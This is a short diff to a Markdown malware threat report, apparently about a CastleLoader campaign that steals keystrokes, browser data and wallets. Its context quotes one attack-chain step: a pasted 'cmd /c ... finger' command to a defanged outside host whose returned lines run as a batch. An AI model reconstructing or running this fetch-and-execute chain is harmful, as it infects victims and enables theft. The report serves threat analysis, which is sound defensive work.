@@ -28,7 +28,7 @@ IMPACT  : Keystroke capture, hidden-desktop remote control, browser, wallet and 
 
 ## Attack Chain
 
-**[Open the interactive attack chain](castleloader-finger-hollowed-agent-chain.html)**: click a step for its evidence and IOCs.
+<!-- chain -->
 
 ```
 Win+R paste: cmd /c ... finger <id>@searperfect[.]com → returned lines run as a batch
